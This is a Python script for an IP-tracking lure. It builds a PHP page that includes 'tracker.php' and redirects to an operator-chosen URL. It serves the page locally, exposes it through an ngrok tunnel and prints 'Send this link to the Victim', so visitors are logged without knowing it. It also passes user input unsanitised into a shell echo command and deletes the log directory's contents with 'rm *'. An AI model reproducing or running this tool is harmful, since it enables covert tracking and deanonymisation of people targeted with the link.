#!/usr/bin/python3
import os as console
import sys
from configparser import ConfigParser 
import time as pomodoro
import subprocess as system
from colorama import Fore, Back, Style

add = {}

class server:
    def initialize(require):
        global add
        if console.path.isfile(require):
            add = ConfigParser()
            add.read(require)
            add["include"] = { 
                'log' : add.get('require','log'),
                'php': add.get('require','php'),
                'home': add.get('require','home')
            }
            return True

    def http_header():
        Path = add["include"]["php"]
        if console.path.isfile(Path + "/tracker.php"):
            intr = input(Fore.GREEN + "[+] Send a raw HTTP header : " + Fore.WHITE)
            console.chdir(Path)
            php = "<?php include 'tracker.php'; header('Location: {}'); exit ?>".format(intr)
            console.system('echo  "{}" > index.php'.format(php))
        pass

    def run_tunnels():
        try:
            path = add["include"]["php"]
            Log = add["include"]["log"]
            console.system("cd {} && php -S 127.0.0.1:3333 > /dev/null 2>&1 & ".format(path))
            pomodoro.sleep(2)
            console.chdir(add["include"]["php"])
            console.system("./ngrok http 3333 > /dev/null 2>&1 &")
            pomodoro.sleep(10)
            Link = str(system.check_output("curl -s localhost:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'", shell=True) , 'utf-8')
            if Link != "":
                print(Fore.GREEN + "[+] Send this link to the Victim: " + Fore.WHITE +"{}".format(Link) + Style.RESET_ALL)
                if console.path.isfile(Log + "/ip.txt"):
                    console.chdir(Log)
                    console.system("rm *")
                    pass
            else:
                print(Fore.RED + "[-] Server Failed To Start !!" + Style.RESET_ALL)
            pass
        except system.CalledProcessError as e:
            raise RuntimeError("command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output))

    initialize(console.path.join(console.path.dirname(console.path.realpath(__file__))) + "/.config.cfg")
    http_header() #Create Location Header
    run_tunnels() #Start HTTP Server 

if __name__ == "__main__":
    server() #run server
    pass